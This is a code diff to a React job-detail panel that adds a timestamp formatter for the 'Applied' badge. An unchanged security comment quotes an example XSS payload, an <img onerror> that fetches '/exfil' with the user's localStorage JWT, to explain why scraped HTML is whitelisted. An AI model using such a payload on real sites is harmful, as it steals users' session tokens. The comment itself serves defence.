@@ -12,6 +12,20 @@ function decodeEntities(str) {
   return txt.value
 }
 
+// Format the applied-at timestamp for the JobDetail side panel.
+// Returns a single string like "May 15, 2026 at 4:42 PM" or "" if unparseable.
+function formatAppliedAtDetail(raw) {
+  if (!raw) return ''
+  let isoish = raw.replace(' ', 'T')
+  if (!/[Zz]|[+-]\d{2}:?\d{2}$/.test(isoish)) isoish += 'Z'
+  const d = new Date(isoish)
+  if (isNaN(d.getTime())) return ''
+  return d.toLocaleString(undefined, {
+    month: 'short', day: 'numeric', year: 'numeric',
+    hour: 'numeric', minute: '2-digit',
+  })
+}
+
 // SECURITY: scraped job descriptions are untrusted HTML — a malicious posting
 // could inject <img src=x onerror="fetch('/exfil', {headers:{Authorization:localStorage.token}})">
 // and exfiltrate the user's JWT. Whitelist only the formatting tags we need
@@ -144,7 +158,11 @@ export default function JobDetail({ job, onClose, onApply, applying }) {
                 {job.source}
               </span>
             )}
-            {job.status === 'applied' && <span style={s.appliedBadge}>✓ Applied</span>}
+            {job.status === 'applied' && (
+              <span style={s.appliedBadge}>
+                ✓ Applied{job.applied_at ? ` · ${formatAppliedAtDetail(job.applied_at)}` : ''}
+              </span>
+            )}
           </div>
 
           {/* Action buttons */}
